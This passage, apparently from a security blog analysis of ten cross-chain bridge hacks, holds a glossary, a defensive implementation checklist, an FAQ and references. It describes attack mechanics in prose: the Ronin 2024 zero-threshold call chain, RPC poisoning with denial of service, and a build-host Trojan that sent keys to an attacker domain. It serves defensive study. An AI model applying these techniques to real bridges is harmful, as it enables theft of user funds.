| **State root** | The Merkle root committed in a block header; once signed, everything provable against it is treated as authentic by the target chain. |
| **Merkle proof / witness** | The path of sibling hashes that proves a leaf belongs to a tree with a given root; Poly Network's verifier accepts an empty path, in which case the leaf hash must equal the root. |
| **IAVL proof** | The Merkle proof format used by Tendermint applications, in which path nodes carry explicit `left` and `right` attributes rather than deriving concatenation order from the sibling values. |
| **Minimum vote weight** | The signature weight threshold a withdrawal must reach on the Ronin bridge; derived from total operator weight, it was zero after the 2024 upgrade. |
| **Transparent Upgradeable Proxy** | A proxy pattern where a `ProxyAdmin` may replace the implementation while all other calls are forwarded to it; the pattern Ronin used in 2024. |
| **Initializer** | A function that sets an upgradeable contract's storage in place of a constructor; skipping one leaves the affected variables at their default values. |
| **RPC poisoning** | Manipulating the responses an off-chain component receives when it queries chain state, so that it acts on a view of the chain that does not match reality. |
| **Fail closed** | A design in which a component refuses to act when its inputs or quorum degrade, rather than continuing on a reduced set. The property LayerZero's RPC redundancy lacked. |
| **SEAL 911** | A group of security professionals and volunteers offering emergency response to protocols under active exploitation, which assisted Ronin in 2024. |

### Security Implementation Checklist

The items below are derived from the failure modes observed in the ten incidents. They are properties a bridge implementation and its operating procedure either meet or fail, rather than a transcription of any single standard.

#### Trust anchor and key custody

| Check | Security requirement | Failure mode if violated |
|:---:|------------|------------|
| ☐ | Signers in a threshold set occupy genuinely independent failure domains (distinct organisations, networks, and devices). | A single compromised corporate network yields a majority, as with the four Sky Mavis validators in 2022. |
| ☐ | Every delegation of signing authority has an expiry and is revoked when the reason for it ends. | A stale allowlist grants an attacker the marginal signature needed to reach the threshold. |
| ☐ | Signing keys are held in hardware or an HSM, never readable from a wallet file on a general-purpose host. | A Trojan reading the local wallet file exfiltrates the key on process start, as at Poly Network. |
| ☐ | No single individual holds unilateral control of operational funds, servers or recovery material. | The protocol stops when that person does, as at Multichain. |
| ☐ | The signer set and its threshold are reviewed against current TVL, not against the value at launch. | Three keeper EOAs securing a high-TVL bridge concentrate an unbounded loss behind a small signing set. |

#### Verifier configuration

| Check | Security requirement | Failure mode if violated |
|:---:|------------|------------|
| ☐ | The number of required independent attestors is greater than one, and the configuration is pinned rather than inherited from a platform default. | A single verifier's compromised view authorises a release with nothing able to contradict it, as with Kelp DAO's 1-of-1 DVN. |
| ☐ | The party that bears the loss reviews and owns the verifier configuration. | Security posture is chosen by whoever finds it convenient, and no one is accountable for the choice afterwards. |
| ☐ | Each attestor reads origin chain state from several independent sources and **fails closed** when agreement is unavailable. | Degrading the honest sources forces failover onto the attacker's, which is precisely how LayerZero's redundancy was defeated. |
| ☐ | Attestors wait for finality appropriate to the origin chain before signing. | A reorganisation removes the commitment while the release stands. |

#### Software supply chain

| Check | Security requirement | Failure mode if violated |
|:---:|------------|------------|
| ☐ | Each party compiles the node software independently and compares binary hashes before running it. | One compromised build host distributes a backdoored binary to every participant, defeating the multi-party design. |
| ☐ | The build environment is reproducible (containerised or equivalent) so hash comparison is meaningful. | Divergent toolchains make legitimate binaries differ, so the comparison is abandoned and the control lapses. |
| ☐ | Build machines are isolated from other uses and their access is logged and audited. | A build host used for general work becomes reachable from a phishing foothold. |
| ☐ | Hosts running signing or verification software restrict outbound network egress to known destinations. | Keys or state are exfiltrated to attacker infrastructure on first start. |
| ☐ | Source repository access is under fine-grained control with an audit trail. | An implant is committed or injected without attribution or detection. |

#### Upgrades and deployment

| Check | Security requirement | Failure mode if violated |
|:---:|------------|------------|
| ☐ | Every storage variable read by a new implementation is written by an initializer that the upgrade actually executes. | An uninitialized threshold defaults to zero and all authorisation checks pass, as in Ronin 2024. |
| ☐ | No initialisation sets a trusted value to one that the contract elsewhere treats as untrusted. | A trusted root of `0x00` makes every unproven message valid, as at Nomad. |
| ☐ | Post-upgrade invariants (threshold greater than zero, operator count and weight non-zero, escrow balance unchanged) are asserted before the contract is unpaused. | A misconfiguration goes live and is discoverable by anyone reading the mempool. |
| ☐ | The gateway is paused for the duration of a multi-step upgrade. | A window between two transactions is exploitable, which in 2024 was 48 minutes wide. |
| ☐ | A security fix is deployed before its source becomes public, and dependency deprecation notices are treated as disclosures. | The patch itself becomes the exploit tip-off, as in the 53 minutes between Wormhole's pull request and the mint. |
| ☐ | No implementation reaches mainnet without a third-party audit and invariant or fuzz testing of the authorisation path. | A threshold check that passes on zero weight is never exercised by conventional unit tests. |

#### Verification logic

| Check | Security requirement | Failure mode if violated |
|:---:|------------|------------|
| ☐ | The withdrawal threshold is validated as strictly positive at the point of use, not only at configuration time. | `0 >= 0` satisfies the comparison and authorises an unsigned withdrawal. |
| ☐ | Every field of a caller-supplied proof either constrains verification or is rejected. | An ignored `right` attribute carries the hash of an attacker's payload past an otherwise sound verifier, as at BSC Token Hub. |
| ☐ | Merkle verification rejects zero-length witnesses and enforces the expected leaf structure and depth. | A signed root can authorise an arbitrary single-leaf payload with no structural constraint. |
| ☐ | Every account a program reads is checked to be the account it is supposed to be, especially runtime-provided ones. | A forged instructions sysvar makes every signature verify, as on Solana in the Wormhole case. |
| ☐ | A dispatcher that routes untrusted input to a privileged callee constrains the reachable function set explicitly. | A brute-forced selector collision reaches a keeper-management function, as at Poly Network in 2021. |
| ☐ | Signatures are checked for duplicate signers and against the current signer set, with the set change itself governed. | Repeated signatures from one compromised key satisfy a naive count. |
| ☐ | Every cross-chain message is bound to a chain identifier and a unique, single-use transaction identifier. | A proof valid on one chain or already consumed is replayed on another chain or a second time. |

#### Monitoring and loss limitation

| Check | Security requirement | Failure mode if violated |
|:---:|------------|------------|
| ☐ | An independent monitor reconciles every target chain release against the corresponding origin chain commitment and halts the bridge on mismatch. | A forged unlock is indistinguishable from a legitimate one until a user's withdrawal fails, six days later. |
| ☐ | Reconciliation compares message sequence numbers on both sides, not only amounts. | An inbound nonce running ahead of the outbound nonce is the cleanest possible signal, and the Kelp case produced exactly that. |
| ☐ | Monitoring reads chain state through a path independent of the one the verifier uses. | An attacker who controls the shared data source shows the monitor the same fiction it shows the verifier. |
| ☐ | Per-transaction value caps require human approval above a threshold. | The entire escrow leaves in two transactions with no human in the loop. |
| ☐ | Per-token daily volume limits suspend the route when exceeded. | An attacker drains across many transactions on many chains before anyone reacts. |
| ☐ | Large withdrawals are subject to a delay or challenge window during which the monitor can veto and the user then claims. | There is no interval in which detection can convert into prevention. |
| ☐ | A tested pause procedure exists with a defined on-call owner and a target reaction time. | Seven hours elapse while an attacker works through eleven chains. |

## Frequently Asked Questions

**Q: Is bridge security a code problem or an operations problem?**

Both, in roughly equal measure, and the split is the reason to group these incidents by failure class.

Four of the ten turned on a defect in code: a selector collision at Poly Network in 2021, an unchecked account in Wormhole, a trusted root of zero at Nomad, and an ignored proof field at BSC Token Hub. A fifth, Ronin 2024, was a deployment error visible in the upgrade transaction. The other five involved no defect at all. Keys were stolen, a build host was backdoored, one person's devices were confiscated, or a verifier was fed a false picture of the source chain.

A review scoped to the contract repository addresses roughly half the historical incidents. Treating either half as the whole problem leaves a bridge exposed to the other.

**Q: If the contracts were correct in Ronin 2022 and Poly Network 2023, what exactly was exploited?**

The trust assumption the contracts encode. A bridge gateway verifies that a withdrawal carries enough valid signatures from a known signing set, and nothing else. It cannot observe the origin chain independently, so a correctly signed message is authentic by definition from the contract's point of view.

In both incidents the attackers obtained the signing keys, in one case through social engineering and in the other through a Trojan in the build pipeline, and then produced messages that verified perfectly. The exploit happened entirely outside the chain; the contract simply executed the instruction it was given.

**Q: Why did compromising Sky Mavis alone not suffice, and what closed the gap?**

Sky Mavis operated four of the nine validators, one short of the five needed. The gap was closed by a permission granted in November 2021, when the Axie DAO allowlisted Sky Mavis to sign transactions on its behalf through a gas-free RPC node to handle a traffic surge. The arrangement stopped in December 2021 but the allowlist entry was never removed, so an attacker with access to Sky Mavis systems could still obtain the Axie DAO validator's signature. A revocation step that was never performed converted a 4-of-9 foothold into a 5-of-9 majority.

**Q: How did a multi-party consensus set end up with all its keys in one attacker's hands at Poly Network?**

The parties were independent but the software was not. Node binaries were compiled in a single place and distributed to every participant, so a Trojan implanted in that compilation environment shipped to all of them. On startup the implant read the local wallet file and keys and uploaded them by shelling out to `curl` against `pypa.tech`.

That gave the attackers 2f+1 consensus keys from a single compromise. Poly Network's remediation addresses exactly this: each party now compiles independently and compares binary hashes before running the result, with containers used to make the environments comparable.

**Q: Kelp DAO already had multiple independent RPC sources. Why did that not stop the attack?**

Because the redundancy failed open. The DVN read from internal and external RPC nodes so that no single provider could mislead it, which is the right instinct. The attackers poisoned two internal nodes and then ran a denial of service attack against the external provider. When the honest source stopped answering, the system did what most systems do and failed over to what remained, which was the attacker's pair.

A control that degrades gracefully under load is the opposite of what is wanted here. The verifier should have refused to attest once its set of agreeing sources fell below the assumed minimum. That is the difference between redundancy and a quorum requirement, and it is the single most transferable lesson from the incident, because the naive version of the control is very widely deployed.

**Q: Trace the Ronin 2024 exploit from the upgrade to the transfer of funds.**

The upgrade moved the proxy from version 2 to version 4 and added two initializers, but only `initializeV4` executed. `initializeV3` was skipped, leaving `_totalOperatorWeight` at its default of zero. Previous versions had read the total weight from the bridge manager at call time, so storing it removed the fallback that would otherwise have masked the omission.

From there the call chain is mechanical: `submitWithdrawal` reaches `_submitWithdrawal`, which calls `_computeMinVoteWeight`; that calls `_getTotalWeight`, which returns zero; `_minimumVoteWeight` therefore returns zero and sets `minimumWeight` to zero. With submitted weight and minimum weight both zero the threshold comparison passes, `passed` becomes true, and `handleAssetOut` calls `send()`.

The practical result is that no signature was required at all. An MEV bot watching the mempool executed this 48 minutes after the upgrade, front-running other attempts at the same target.

**Q: Which single control would have limited the loss across the most incidents?**

A withdrawal delay combined with an independent reconciliation monitor, backed by per-transaction and daily value limits. It works because it does not depend on identifying the attack vector. The monitor compares what was released on the target chain against what was committed on the origin chain, so a forged release fails reconciliation whether the signature came from a stolen key, a Trojaned binary, a threshold set to zero, a proof with an ignored field, or a poisoned RPC feed. The delay supplies the interval in which that detection can become a veto rather than a post-mortem.

One caveat matters for the monitor. It has to read chain state through a path that does not share a dependency with the verifier it is checking. The Kelp attackers specifically arranged for the monitoring stack to see the truth while the verifier saw the fiction, which is the inverse arrangement, but it demonstrates that the two views can be separated deliberately.

Measured against the actual timelines, the gap it would have closed is large: six days before anyone noticed at Ronin in 2022, seven hours at Poly Network, and 48 minutes at Ronin in 2024. Value caps bound the exposure independently of detection speed, which matters because Ronin 2022 lost approximately $540M in two transactions, faster than any monitor could have reacted.

**Q: The Poly Network 2023 hack is often cited at around $34B. Why is that figure misleading?**

It is a notional figure summing the face value of the affected token balances, whereas the realised amount was far lower because most of those tokens were illiquid. An attacker cannot extract more than the market depth for a given asset allows, so selling into thin order books moves the price against them long before the nominal balance is realised.

The distinction matters when prioritising bridge risk: exposure should be assessed against the liquidity of the assets held in escrow, not against the total value displayed on a dashboard.

**Q: Why do some of these end with the funds returned and others not?**

Recovery was decided outside the protocol in every single case, and the deciding factor was who held the funds and what they wanted.

Poly Network in 2021 and Ronin in 2024 were returned because the people who took the funds chose to give them back, in the second case for a $500K bounty coordinated with the SEAL 911 volunteer group. Ronin 2022 users were made whole from a funding round and the company balance sheet, because the attacker was Lazarus Group and no negotiation was available. Kelp DAO was restored by an industry recovery effort that raised around $300M, combined with liquidating the attacker's own leveraged positions. Horizon, Multichain and Poly Network 2023 have no published recovery.

No on-chain mechanism produced any of these outcomes. A threat model that assumes the protocol handles its own worst case is assuming something no incident here supports, which is the argument for bounding the loss before it happens.

## References

### Poly Network 2021

- [The Poly Network Hack Explained](https://kudelskisecurity.com/research/the-poly-network-hack-explained) — Kudelski Security Research Center, August 2021
- [TRM Tracks the Poly Network Hack as Attacker Communicates in Real Time](https://www.trmlabs.com/resources/blog/trm-tracks-the-poly-network-hack-as-attacker-communicates-in-real-time) — TRM Labs, 9 August 2021

### Wormhole 2022

- [Quick Analysis of the Wormhole attack](https://kudelskisecurity.com/research/quick-analysis-of-the-wormhole-attack) — Kudelski Security Research Center, 6 February 2022
- [Hack Track: Analysis of the Wormhole Token Bridge Exploit](https://www.merklescience.com/blog/hack-track-analysis-of-wormhole-token-bridge-exploit) — Merkle Science, 4 February 2022
- Solana Wormhole Compromise: 120k Wrapped ETH Stolen — TRM Labs
- Stolen funds from the Wormhole hack on the move, after laying dormant for almost a year — Elliptic

### Ronin 2022

- [Back to Building: Ronin Security Breach Postmortem](https://roninchain.com/blog/posts/back-to-building-ronin-security-breach-6513cc78a5edc1001b03c364) — Sky Mavis official post-mortem, 27 April 2022
- [North Korea's Lazarus Group identified as exploiters behind $540 million Ronin bridge heist](https://www.elliptic.co/blog/540-million-stolen-from-the-ronin-defi-bridge) — Elliptic, 14 April 2022
- North Korea's Lazarus Group moves funds through Tornado Cash — TRM Labs

### Harmony Horizon 2022

- [Summary of the Horizon Bridge Incident](https://talk.harmony.one/t/summary-of-the-horizon-bridge-incident/20990) — Harmony Community Forum, 3 August 2022
- Over $1 billion stolen from bridges so far in 2022 as Harmony's Horizon Bridge becomes latest victim in $100 million hack — Elliptic, 24 June 2022

### Nomad 2022

- [Decentralized Robbery: Dissecting the Nomad Bridge Hack and Following the Money](https://cloud.google.com/blog/topics/threat-intelligence/dissecting-nomad-bridge-hack) — Mandiant, Google Cloud
- [Nomad Loses $156 Million in Seventh Major Crypto Bridge Exploit of 2022](https://www.elliptic.co/insights/nomad-loses-156-million-in-seventh-major-crypto-bridge-exploit-of-2022/) — Elliptic, 3 August 2022
- Key Suspect in $190M Nomad Bridge Exploit Extradited to the United States — TRM Labs, 15 May 2025

### BSC Token Hub 2022

- [Hack Analysis: Binance Bridge, October 2022](https://medium.com/immunefi/hack-analysis-binance-bridge-october-2022-2876d39247c1) — Immunefi, 17 March 2023
- Binance Smart Chain Back Online After $560M Bridge Hack — The Defiant
- [bnb-chain/bsc](https://github.com/bnb-chain/bsc) — node source; compare v1.1.14 against v1.1.16 for the precompile patch

### Multichain 2023

- Multichain Protocol Experiences Mysterious Withdrawals, Suggesting Multi-Million Dollar Hack or Rug Pull — Chainalysis, July 2023
- Crypto bridge Multichain says it's ceasing operations after CEO and sister arrested in China — DL News, 14 July 2023
- Singapore court ruling fans suspicions the $125m Multichain hack was an inside job — DL News, 17 July 2024

### Poly Network 2023

- [Poly Network Hack Postmortem](https://dedaub.com/blog/poly-network-hack/) — Dedaub, Neville Grech
- [The Poly Network Exploit Analysis](https://polynetwork.medium.com/the-poly-network-exploit-analysis-b0a77aff6078) — Poly Network official analysis, 20 November 2023
- [Poly Bridge Cross-Chain Security Reinforcement Solution](https://polynetwork.medium.com/poly-bridge-cross-chain-security-reinforcement-solution-86b8c9abecbc) — Poly Network remediation plan, 22 December 2023

### Ronin 2024

- [Ronin Bridge Attack: $12M Loss](https://threesigma.xyz/blog/exploit/ronin-network-12m-exploit-analysis) — Three Sigma, Simeon Cholakov, 7 August 2024
- Explained: The Ronin Network Hack (August 2024) — Halborn, 8 August 2024
- [axieinfinity/ronin-bridge-contracts](https://github.com/axieinfinity/ronin-bridge-contracts) — gateway source

### Kelp DAO and LayerZero 2026

- [LayerZero Labs KelpDAO Incident Report](https://layerzero.network/blog/layerzero-labs-kelpdao-incident-report) — LayerZero, 20 May 2026
- [KelpDAO Incident Statement](https://layerzero.network/blog/kelpdao-incident-statement) — LayerZero, 19 April 2026
- [LayerZero Update](https://layerzero.network/blog/an-overdue-apology) — LayerZero, 8 May 2026
- [Ongoing Security Updates 7/10](https://layerzero.network/blog/ongoing-security-updates-july-10) — LayerZero, 10 July 2026
- Kelp DAO Incident Response — Kelp DAO, 19 April 2026
- [April 18, 2026 rsETH Incident Post Mortem](https://x.com/aave/status/2060901386611499378) — Aave

### Related articles

- [Cross-Chain Bridge Threat Model](https://rya-sge.github.io/access-denied/2026/07/31/cross-chain-bridge-threat-model/)
- [Zero-Knowledge Proof Failures in Cross-Chain Bridges](https://rya-sge.github.io/access-denied/2026/06/19/zkp-cross-chain-bridge-hacks/)

### Tooling

- [Claude Code](https://claude.com/product/claude-code)
